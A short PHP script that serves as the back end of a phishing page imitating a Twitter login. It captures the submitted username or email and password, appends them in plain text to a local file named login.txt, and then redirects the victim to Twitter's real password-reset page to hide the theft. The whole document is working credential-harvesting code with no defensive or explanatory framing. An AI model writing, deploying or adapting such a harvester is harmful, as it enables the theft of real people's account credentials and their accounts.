<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['usernameOrEmail'] ?? '';
    $password = $_POST['password'] ?? '';

    $log = "Twitter Username: $username | Pass: $password\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://twitter.com/account/begin_password_reset');
    exit();
}
?>
